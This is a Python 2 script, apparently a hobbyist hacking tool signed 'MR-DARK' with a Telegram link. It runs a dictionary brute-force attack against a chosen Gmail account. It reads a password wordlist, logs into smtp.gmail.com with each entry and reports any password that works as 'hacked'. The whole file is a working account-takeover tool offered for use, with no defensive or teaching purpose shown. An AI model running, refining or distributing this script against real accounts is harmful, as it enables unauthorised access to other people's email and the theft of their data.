#!/usr/bin/python
#https://t.me/name_dark

import smtplib
from os import system
import os,sys
os.system ('clear')


print ('\033[1;35m')
def main():
   print '================================================='
   print '               https://t.me/name_dark            '
   print '================================================='
   print '               ++++++++++++++++++++              '
   print '\n                                               '
   print '                                                 '
   print '                                                 '
   print '                                                 '
   print '           M R - D A R K                         '
   print '       _,.                   '
   print '     ,` -.)                  '
   print '    ( _/-\\-._               '
   print '   /,|`--._,-^|            , '
   print '   \_| |`-._/||          , | '
   print '     |  `-, / |         /  / '
   print '     |     || |        /  /  '
   print '      `r-._||/   __   /  /   '
   print '  __,-<_     )`-/  `./  /    '
   print '  \   `---    \   / /  /     '
   print '     |           |./  /      '
   print '     /           //  /       '
   print ' \_/  \         |/  /        '
   print '  |    |   _,^- /  /         '
   print '  |    , ``  (\/  /_         '
   print '   \,.->._    \X-=/^         '
   print '   (  /   `-._//^`           '
   print '    `Y-.____(__}             '
   print '     |     {__)              ' 
   print '           ()   V.1.0        '

main()
print ('\033[1;33m')

print '\n[1] start the attack'

print '\n[2] exit'

option = input('\n====> ')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
